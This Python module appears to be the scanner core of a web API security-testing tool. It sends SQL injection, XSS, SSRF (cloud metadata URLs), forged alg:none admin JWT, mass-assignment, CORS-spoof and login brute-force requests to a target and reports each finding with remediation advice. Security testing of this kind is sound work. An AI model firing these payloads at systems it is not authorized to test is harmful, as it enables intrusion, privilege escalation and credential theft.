"""
core/scanner.py — Real Vulnerability Scanner

Tests discovered API endpoints for OWASP API Top 10 vulnerabilities.
Each test sends real HTTP requests to the target.
"""

import time
import json
import re
import requests


# ─── SQLi Payloads ──────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "'", "''", "' OR '1'='1", "' OR '1'='1'--",
    "1' OR 1=1--", "' UNION SELECT NULL--",
    "1; SELECT SLEEP(2)--", "' AND SLEEP(2)--",
    "\" OR \"1\"=\"1",
]
SQLI_ERRORS = [
    'sql syntax', 'mysql_fetch', 'ORA-', 'pg_query',
    'sqlite3', 'SQLSTATE', 'syntax error', 'unclosed quotation',
    'microsoft sql', 'invalid query', 'db error', 'database error',
]

# ─── XSS Payloads ───────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<img src=x onerror=alert(1)>',
    '{{7*7}}',  # Template injection probe
    '${7*7}',
]

# ─── JWT Attack Payloads ─────────────────────────────────────────────────────
# Algorithm: none bypass
JWT_NONE_HEADER = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0'  # {"typ":"JWT","alg":"none"}
JWT_NONE_PAYLOAD_ADMIN = 'eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0'  # {"user_id":1,"role":"admin","sub":"1"}

# ─── SSRF Internal Targets ──────────────────────────────────────────────────
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',       # AWS metadata
    'http://169.254.169.254/latest/meta-data/iam/',
    'http://metadata.google.internal/computeMetadata/v1/',  # GCP
    'http://localhost/admin',
    'http://127.0.0.1:8080/admin',
    'http://[::1]/admin',
]


class VulnScanner:
    def __init__(self, target, endpoints, options, log_fn, is_stopped_fn):
        self.target = target.rstrip('/')
        self.endpoints = endpoints
        self.options = options
        self.log = log_fn
        self.is_stopped = is_stopped_fn
        self.timeout = int(options.get('timeout', 8))
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; APIReaper/1.0; Security Scanner)',
            'Content-Type': 'application/json',
        })
        if options.get('auth_token'):
            self.session.headers['Authorization'] = f"Bearer {options['auth_token']}"

    def run(self):
        tests = [
            ('auth_bypass', self._test_auth_bypass),
            ('bola', self._test_bola),
            ('bfla', self._test_bfla),
            ('sqli', self._test_sqli),
            ('mass_assign', self._test_mass_assignment),
            ('cors', self._test_cors),
            ('rate_limit', self._test_rate_limit),
            ('info_disc', self._test_info_disclosure),
            ('headers', self._test_security_headers),
        ]
        if self.options.get('inject_test', True):
            tests.append(('xss', self._test_xss))
            tests.append(('ssrf', self._test_ssrf))
        if self.options.get('jwt_test', True):
            tests.append(('jwt', self._test_jwt))

        for name, test_fn in tests:
            if self.is_stopped():
                break
            self.log('info', f'Running {name.upper()} tests...')
            try:
                test_fn()
            except Exception as e:
                self.log('warn', f'{name} test error: {e}')
            time.sleep(0.1)

        return self.vulns

    # ─── TEST: UNAUTHENTICATED ACCESS ─────────────────────────────────────────

    def _test_auth_bypass(self):
        """Test endpoints without Authorization header"""
        no_auth_session = requests.Session()
        no_auth_session.headers.update({'User-Agent': self.session.headers['User-Agent']})

        sensitive_paths = [e for e in self.endpoints if any(
            kw in e['path'] for kw in ['/user', '/profile', '/admin', '/me', '/order', '/invoice', '/config']
        )]

        for ep in sensitive_paths[:8]:
            if self.is_stopped():
                break
            try:
                resp = no_auth_session.get(ep['url'], timeout=self.timeout)
                if resp.status_code == 200:
                    body = resp.text
                    # Check if response looks like real data (not just a 200 empty response)
                    if len(body) > 20 and any(kw in body.lower() for kw in ['email', 'user', 'id', 'name', 'token']):
                        self._add_vuln(
                            'NO_AUTH',
                            'Unauthenticated Endpoint Exposure',
                            'HIGH',
                            ep['path'], ep['method'],
                            f'GET {ep["path"]} returned 200 with data and no auth token',
                            resp.text[:300],
                            'CWE-306', '7.5',
                            'Add authentication middleware to all sensitive endpoints. Verify auth is checked server-side, not just client-side.',
                            f'GET {ep["path"]} HTTP/1.1\nHost: {self._host()}\n[No Authorization header]'
                        )
                        self.log('error', f'[HIGH] No-auth access: GET {ep["path"]} → 200')
            except Exception:
                pass

    # ─── TEST: BOLA (Broken Object Level Authorization) ───────────────────────

    def _test_bola(self):
        """Test object-level authorization by enumerating IDs"""
        id_endpoints = [e for e in self.endpoints if re.search(r'/\{?id\}?|\d+', e['path'])]

        for ep in id_endpoints[:5]:
            if self.is_stopped():
                break
            path = ep['path']

            # Try accessing a range of sequential IDs
            responses = []
            for test_id in [1, 2, 3, 100, 9999]:
                test_path = re.sub(r'\{[^}]+\}|\b\d+\b', str(test_id), path, count=1)
                url = self.target + test_path
                try:
                    resp = self.session.get(url, timeout=self.timeout)
                    responses.append((test_id, resp.status_code, len(resp.text)))
                except Exception:
                    pass
                time.sleep(0.05)

            # If multiple IDs return 200 with different response sizes, likely BOLA
            ok_responses = [r for r in responses if r[1] == 200]
            if len(ok_responses) >= 2:
                sizes = set(r[2] for r in ok_responses)
                if len(sizes) > 1:  # Different sizes = different records returned
                    self._add_vuln(
                        'BOLA',
                        'Broken Object Level Authorization (BOLA / IDOR)',
                        'CRITICAL',
                        path, 'GET',
                        f'Endpoint returns different users\' data for IDs {[r[0] for r in ok_responses]}. '
                        f'No ownership validation detected.',
                        f'IDs tested: {[r[0] for r in ok_responses]}\nStatus codes: {[r[1] for r in ok_responses]}',
                        'CWE-639', '9.1',
                        'Implement object-level authorization. Verify the requesting user owns the resource before returning data.',
                        f'GET {path.replace("{id}","4728")} HTTP/1.1\nAuthorization: Bearer <any_valid_token>'
                    )
                    self.log('critical', f'[CRITICAL] BOLA on {path}')

    # ─── TEST: BFLA (Broken Function Level Authorization) ────────────────────

    def _test_bfla(self):
        """Test if admin-level endpoints are accessible with regular tokens"""
        admin_endpoints = [e for e in self.endpoints if any(
            kw in e['path'] for kw in ['/admin', '/manage', '/internal', '/superuser', '/root']
        )]

        for ep in admin_endpoints[:5]:
            if self.is_stopped():
                break
            try:
                resp = self.session.get(ep['url'], timeout=self.timeout)
                if resp.status_code == 200:
                    self._add_vuln(
                        'BFLA',
                        'Broken Function Level Authorization',
                        'CRITICAL',
                        ep['path'], ep['method'],
                        f'Admin endpoint {ep["path"]} accessible without admin privilege check.',
                        resp.text[:300],
                        'CWE-285', '8.8',
                        'Implement role-based access control (RBAC). Never rely on URL obscurity for security.',
                        f'GET {ep["path"]} HTTP/1.1\nAuthorization: Bearer <regular_user_token>'
                    )
                    self.log('critical', f'[CRITICAL] BFLA: {ep["path"]} accessible')
            except Exception:
                pass

    # ─── TEST: SQL INJECTION ─────────────────────────────────────────────────

    def _test_sqli(self):
        """Test GET params and JSON body for SQL injection"""
        # Test GET endpoints with params
        get_endpoints = [e for e in self.endpoints if e['method'] == 'GET' and
                         any(kw in e['path'] for kw in ['/search', '/find', '/filter', '/list', '/get'])]

        for ep in get_endpoints[:4]:
            if self.is_stopped():
                break
            for payload in SQLI_PAYLOADS[:4]:
                url = f"{ep['url']}?q={requests.utils.quote(payload)}&id={requests.utils.quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=self.timeout)
                    body_lower = resp.text.lower()
                    if any(err in body_lower for err in SQLI_ERRORS):
                        self._add_vuln(
                            'SQLI',
                            'SQL Injection',
                            'HIGH',
                            ep['path'], 'GET',
                            f'SQL error detected in response when injecting: {payload}',
                            resp.text[:400],
                            'CWE-89', '8.2',
                            'Use parameterized queries or prepared statements. Never concatenate user input into SQL.',
                            f"GET {ep['path']}?q={payload} HTTP/1.1"
                        )
                        self.log('error', f'[HIGH] SQLi on {ep["path"]}?q={payload}')
                        break
                except Exception:
                    pass

    # ─── TEST: MASS ASSIGNMENT ────────────────────────────────────────────────

    def _test_mass_assignment(self):
        """Test POST/PUT endpoints for mass assignment"""
        write_endpoints = [e for e in self.endpoints if e['method'] in ['POST', 'PUT', 'PATCH']
                           and '/user' in e['path']]

        for ep in write_endpoints[:3]:
            if self.is_stopped():
                break
            # Try to inject privileged fields
            payload = json.dumps({
                'name': 'testuser',
                'email': 'test@test.com',
                'role': 'admin',          # <- privilege escalation attempt
                'is_admin': True,         # <- privilege escalation attempt
                'admin': True,
                'permissions': ['read','write','admin'],
            })
            try:
                resp = self.session.request(ep['method'], ep['url'],
                    data=payload, timeout=self.timeout)
                body = resp.text.lower()
                if resp.status_code in [200, 201] and any(
                    kw in body for kw in ['"admin":true', '"role":"admin"', '"is_admin":true']
                ):
                    self._add_vuln(
                        'MASS_ASSIGN',
                        'Mass Assignment / Parameter Tampering',
                        'HIGH',
                        ep['path'], ep['method'],
                        'Server accepted and reflected privileged fields (role/admin) in response.',
                        resp.text[:300],
                        'CWE-915', '7.3',
                        'Whitelist only expected fields. Never bind request body directly to database models.',
                        f'{ep["method"]} {ep["path"]} HTTP/1.1\n\n{payload}'
                    )
                    self.log('error', f'[HIGH] Mass assignment: {ep["path"]}')
            except Exception:
                pass

    # ─── TEST: CORS ──────────────────────────────────────────────────────────

    def _test_cors(self):
        """Test for CORS misconfiguration"""
        evil_origin = 'https://evil-attacker.com'
        for ep in self.endpoints[:5]:
            if self.is_stopped():
                break
            try:
                resp = self.session.get(ep['url'], timeout=self.timeout,
                    headers={**dict(self.session.headers), 'Origin': evil_origin})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')

                if acao == evil_origin or acao == '*':
                    severity = 'HIGH' if acac.lower() == 'true' else 'MEDIUM'
                    self._add_vuln(
                        'CORS',
                        'Misconfigured CORS Policy',
                        severity,
                        ep['path'], ep['method'],
                        f'Server reflects arbitrary Origin ({evil_origin}) with credentials={acac}. '
                        f'Allows cross-origin attacks from any website.',
                        f'Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}',
                        'CWE-942', '6.1',
                        'Maintain a strict whitelist of allowed origins. Never combine wildcard (*) with credentials.',
                        f'GET {ep["path"]} HTTP/1.1\nOrigin: {evil_origin}'
                    )
                    self.log('warn', f'[{severity}] CORS misconfiguration on {ep["path"]}')
                    break
            except Exception:
                pass

    # ─── TEST: RATE LIMITING ─────────────────────────────────────────────────

    def _test_rate_limit(self):
        """Test if auth endpoint has rate limiting"""
        auth_endpoints = [e for e in self.endpoints if any(
            kw in e['path'] for kw in ['/login', '/auth', '/signin', '/token', '/otp']
        ) and e['method'] == 'POST']

        for ep in auth_endpoints[:2]:
            if self.is_stopped():
                break
            no_limit_session = requests.Session()
            statuses = []
            for i in range(15):
                try:
                    resp = no_limit_session.post(ep['url'], timeout=3,
                        json={'username': f'test{i}@test.com', 'password': 'wrongpassword'})
                    statuses.append(resp.status_code)
                except Exception:
                    break
                time.sleep(0.05)

            # If we got 15 non-429 responses, no rate limiting
            non_429 = [s for s in statuses if s != 429]
            if len(non_429) >= 12:
                self._add_vuln(
                    'RATE_LIMIT',
                    'Missing Rate Limiting on Auth Endpoint',
                    'MEDIUM',
                    ep['path'], ep['method'],
                    f'No rate limiting detected after {len(statuses)} rapid requests. '
                    f'Brute force attacks on passwords/OTPs are possible.',
                    f'15 rapid requests sent, none returned HTTP 429 Too Many Requests',
                    'CWE-307', '5.3',
                    'Implement rate limiting (e.g., 5 attempts/minute). Add account lockout after repeated failures.',
                    f'POST {ep["path"]} HTTP/1.1\n[15 rapid requests — no throttling observed]'
                )
                self.log('warn', f'[MEDIUM] No rate limiting on {ep["path"]}')

    # ─── TEST: INFO DISCLOSURE ────────────────────────────────────────────────

    def _test_info_disclosure(self):
        """Look for stack traces, internal fields, secrets in responses"""
        sensitive_patterns = [
            (r'password_hash|passwd|hashed_pw', 'Password hash exposed in response'),
            (r'secret_key|api_key|private_key|access_key', 'Secret/API key in response'),
            (r'internal_note|_internal|__meta', 'Internal/private fields exposed'),
            (r'Traceback|stack trace|Exception in|at .*\.java:\d+', 'Stack trace / error detail leaked'),
            (r'mongodb://|postgres://|mysql://|redis://', 'Database connection string in response'),
            (r'\b\d{3}-\d{2}-\d{4}\b', 'Possible SSN in response'),
            (r'\b4[0-9]{12}(?:[0-9]{3})?\b', 'Possible credit card number in response'),
        ]

        for ep in self.endpoints[:10]:
            if self.is_stopped():
                break
            try:
                resp = self.session.get(ep['url'], timeout=self.timeout)
                if resp.status_code == 200:
                    for pattern, description in sensitive_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            self._add_vuln(
                                'INFO_DISC',
                                f'Sensitive Data Exposure: {description}',
                                'MEDIUM',
                                ep['path'], ep['method'],
                                description + f' Pattern matched: `{pattern}`',
                                resp.text[:400],
                                'CWE-200', '5.3',
                                'Filter API responses using DTOs/serializers. Never expose internal fields or secrets.',
                                f'GET {ep["path"]} HTTP/1.1'
                            )
                            self.log('warn', f'[MEDIUM] Info disclosure on {ep["path"]}: {description}')
                            break
            except Exception:
                pass

    # ─── TEST: SECURITY HEADERS ──────────────────────────────────────────────

    def _test_security_headers(self):
        """Check for missing security headers"""
        required_headers = {
            'X-Content-Type-Options': 'Prevents MIME sniffing attacks',
            'X-Frame-Options': 'Prevents clickjacking',
            'Strict-Transport-Security': 'Enforces HTTPS (HSTS)',
            'Content-Security-Policy': 'Prevents XSS and injection attacks',
            'X-XSS-Protection': 'Browser XSS filter',
        }
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            missing = []
            for header, reason in required_headers.items():
                if header.lower() not in {h.lower() for h in resp.headers}:
                    missing.append(f'{header}: {reason}')

            if len(missing) >= 2:
                self._add_vuln(
                    'HEADERS',
                    'Missing Security Headers',
                    'LOW',
                    '/', 'GET',
                    f'{len(missing)} security headers are missing from responses.',
                    '\n'.join(missing),
                    'CWE-693', '3.7',
                    'Add security headers in your web server config or application middleware.',
                    f'GET / HTTP/1.1\n[Response missing: {", ".join(h.split(":")[0] for h in missing)}]'
                )
                self.log('info', f'[LOW] Missing {len(missing)} security headers')
        except Exception:
            pass

    # ─── TEST: XSS ────────────────────────────────────────────────────────────

    def _test_xss(self):
        """Test reflected XSS in API parameters"""
        for ep in self.endpoints[:5]:
            if self.is_stopped():
                break
            if ep['method'] != 'GET':
                continue
            for payload in XSS_PAYLOADS[:3]:
                url = f"{ep['url']}?q={requests.utils.quote(payload)}&search={requests.utils.quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=self.timeout)
                    if payload in resp.text:
                        self._add_vuln(
                            'XSS',
                            'Reflected Cross-Site Scripting (XSS)',
                            'HIGH',
                            ep['path'], 'GET',
                            f'Payload reflected unescaped in API response: {payload}',
                            resp.text[:300],
                            'CWE-79', '7.4',
                            'HTML-encode all user input in responses. Implement Content-Security-Policy headers.',
                            f"GET {ep['path']}?q={payload}"
                        )
                        self.log('error', f'[HIGH] XSS reflected on {ep["path"]}')
                        break
                except Exception:
                    pass

    # ─── TEST: SSRF ───────────────────────────────────────────────────────────

    def _test_ssrf(self):
        """Test SSRF on URL-accepting parameters"""
        url_endpoints = [e for e in self.endpoints if e['method'] in ['POST', 'PUT'] and
                         any(kw in e['path'] for kw in ['/webhook', '/import', '/fetch', '/proxy', '/url', '/callback'])]

        for ep in url_endpoints[:3]:
            if self.is_stopped():
                break
            for payload in SSRF_PAYLOADS[:2]:
                try:
                    resp = self.session.post(ep['url'], timeout=5,
                        json={'url': payload, 'webhook_url': payload, 'callback': payload})
                    if resp.status_code == 200 and any(kw in resp.text for kw in
                        ['ami-id', 'iam', 'computeMetadata', 'instance-id', 'localhost']):
                        self._add_vuln(
                            'SSRF',
                            'Server-Side Request Forgery (SSRF)',
                            'HIGH',
                            ep['path'], ep['method'],
                            f'Server made internal request to {payload}. Internal metadata/service exposed.',
                            resp.text[:400],
                            'CWE-918', '7.5',
                            'Validate and allowlist URL schemes and destinations. Block requests to private IP ranges (RFC1918).',
                            f'POST {ep["path"]} HTTP/1.1\n\n{{"url":"{payload}"}}'
                        )
                        self.log('critical', f'[HIGH] SSRF on {ep["path"]}')
                        break
                except Exception:
                    pass

    # ─── TEST: JWT ────────────────────────────────────────────────────────────

    def _test_jwt(self):
        """Test JWT algorithm confusion and none algorithm"""
        auth_headers_endpoints = [e for e in self.endpoints if e['status'] in [200, 401, 403]]

        for ep in auth_headers_endpoints[:3]:
            if self.is_stopped():
                break
            # Test alg:none bypass
            fake_token = f'{JWT_NONE_HEADER}.{JWT_NONE_PAYLOAD_ADMIN}.'
            try:
                resp = requests.get(ep['url'], timeout=self.timeout, headers={
                    'Authorization': f'Bearer {fake_token}',
                    'User-Agent': self.session.headers['User-Agent'],
                })
                if resp.status_code == 200:
                    self._add_vuln(
                        'JWT_NONE',
                        'JWT Algorithm Confusion — "none" Bypass',
                        'CRITICAL',
                        ep['path'], ep['method'],
                        'Server accepted a JWT with algorithm set to "none" and no signature. Authentication completely bypassed.',
                        resp.text[:300],
                        'CWE-327', '9.0',
                        'Explicitly whitelist allowed JWT algorithms. Reject tokens with alg=none.',
                        f'GET {ep["path"]} HTTP/1.1\nAuthorization: Bearer {fake_token}'
                    )
                    self.log('critical', f'[CRITICAL] JWT none bypass on {ep["path"]}')
                    break
            except Exception:
                pass

    # ─── HELPERS ─────────────────────────────────────────────────────────────

    def _add_vuln(self, vuln_id, name, severity, path, method,
                  description, evidence, cwe, cvss, remediation, poc_request):
        # Deduplicate by vuln_id + path
        for v in self.vulns:
            if v['id'] == vuln_id and v['endpoint'] == path:
                return

        self.vulns.append({
            'id': vuln_id,
            'name': name,
            'severity': severity,
            'endpoint': path,
            'method': method,
            'description': description,
            'evidence': evidence,
            'cwe': cwe,
            'cvss': cvss,
            'remediation': remediation,
            'poc_request': poc_request,
        })

    def _host(self):
        from urllib.parse import urlparse
        return urlparse(self.target).netloc
